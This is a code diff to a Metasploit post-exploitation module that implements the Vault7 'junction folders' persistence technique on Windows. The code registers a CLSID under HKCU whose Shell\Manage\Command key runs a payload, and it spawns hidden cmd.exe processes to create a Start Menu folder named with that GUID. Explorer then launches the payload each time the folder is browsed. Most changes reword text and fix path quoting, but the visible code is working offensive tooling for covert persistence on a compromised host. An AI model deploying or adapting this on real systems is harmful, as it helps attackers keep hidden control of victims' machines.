@@ -15,12 +15,12 @@
 #
 #
 # [ DESCRIPTION ]
-# Implementation of vault7 junction folders persistence mechanism. A junction folder in Windows is a method
-# in which the user can cause a redirection to another folder, this module will add a registry hive in
-# 'HKCU\software\Classes\CLSID\{GUID}' and use sub-key '\Shell\Manage\Command' to execute our payload, then
-# builds a Folder named POC.{GUID} under 'Start Menu\Programs\Accessories' (in persistence mode). In DEMO mode
-# it will take the full path to POC folder and payload from user inputs, Check module ADVANCED OPTIONS to use
-# the 'explorer persistence mode'.
+# Implementation of vault7 junction folders persistence mechanism. A junction folder in Windows is a
+# method in which the user can cause a redirection to another folder. This module will add a registry hive in
+# 'HKCU\software\Classes\CLSID\{GUID}' and use the sub-key '\Shell\Manage\Command' to execute our payload, then
+# builds a Folder named POC.{GUID} under 'Start Menu\Programs\Accessories' (in persistence mode), In DEMO mode
+# it will take the full path to POC folder and payload path from user inputs, Check in module ADVANCED OPTIONS
+# to use the 'explorer persistence mode'.
 #
 #
 # [ MODULE OPTIONS ]
@@ -89,7 +89,7 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'vault7 junction folders [User-level Persistence]',
                         'Description'   => %q{
-                                        Implementation of vault7 junction folders persistence mechanism. A junction folder in Windows is a method in which the user can cause a redirection to another folder, this module will add a registry hive in 'HKCU\software\Classes\CLSID\{GUID}' and use sub-key '\Shell\Manage\Command' to execute our payload, then builds a Folder named POC.{GUID} under 'Start Menu\Programs\Accessories' (in persistence mode). In DEMO mode it will take the full path to POC folder and payload from user inputs, Check module ADVANCED OPTIONS to use the 'explorer persistence mode'.
+                                        Implementation of vault7 junction folders persistence mechanism. A junction folder in Windows is a method in which the user can cause a redirection to another folder. This module will add a registry hive in 'HKCU\software\Classes\CLSID\{GUID}' and use the sub-key '\Shell\Manage\Command' to execute our payload, then builds a Folder named POC.{GUID} under 'Start Menu\Programs\Accessories' (in persistence mode), In DEMO mode it will take the full path to POC folder and payload path from user inputs, Check in module ADVANCED OPTIONS to use the 'explorer persistence mode'.
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -208,7 +208,7 @@ def run
     #
     # check if file exists (APPL_PATH)
     #
-    print_status("check if file exists in target ..")
+    print_status("check if APPL exists in target ..")
     if session.fs.file.exist?(app_path)
       print_good("Application (payload) found ..")
     else
@@ -232,7 +232,7 @@ def run
       Rex::sleep(1.0)
       user_name =  client.fs.file.expand_path("%username%")
       # create new GUID and store it in a variable
-      print_status("Creating new GUID key value ..")
+      print_status("Creating new GUID value ..")
       Rex::sleep(1.0)
       new_GUID = cmd_exec("powershell.exe -ep -C \"[guid]::NewGuid().Guid\"")
       print_good("New GUID: #{new_GUID}")
@@ -283,16 +283,16 @@ def run
          #
          r=''
          if datastore['PERSIST_EXPLORER'] == true
-           folder_poc ="\"#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\POC.#{new_GUID}\""
+           folder_poc ="\"#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\POC\""
            print_status("Creating juntion shell folder ..")
            Rex::sleep(1.0)
-           r = session.sys.process.execute("cmd.exe /R mkdir #{folder_poc}", nil, {'Hidden' => true, 'Channelized' => true})
+           r = session.sys.process.execute("cmd.exe /R mkdir #{folder_poc}.#{new_GUID}", nil, {'Hidden' => true, 'Channelized' => true})
            r.channel.close
            r.close
          else
            print_status("Creating juntion shell folder ..")
            Rex::sleep(1.0)
-           r = session.sys.process.execute("cmd.exe /R mkdir #{fol_path}.#{new_GUID}", nil, {'Hidden' => true, 'Channelized' => true})
+           r = session.sys.process.execute("cmd.exe /R mkdir \"#{fol_path}.#{new_GUID}\"", nil, {'Hidden' => true, 'Channelized' => true})
            r.channel.close
            r.close
          end
@@ -308,7 +308,7 @@ def run
          print_line("    Trigger exploit: #{folder_poc}")
          print_line("")
          print_line("    To delete all changes made:")
-         print_line("    cmd.exe /c REG DELETE #{hive_key}\\#{new_GUID}")
+         print_line("    cmd.exe /c reg delete \"#{hive_key}\\#{new_GUID}\" /f")
          print_line("--------------------------------")
          Rex::sleep(1.0)
        else
@@ -317,7 +317,7 @@ def run
          print_line("    Trigger exploit: #{fol_path}")
          print_line("")
          print_line("    To delete all changes made:")
-         print_line("    cmd.exe /c REG DELETE #{hive_key}\\#{new_GUID}")
+         print_line("    cmd.exe /c reg delete \"#{hive_key}\\#{new_GUID}\" /f")
          print_line("--------------------------------")
          Rex::sleep(1.0)
        end
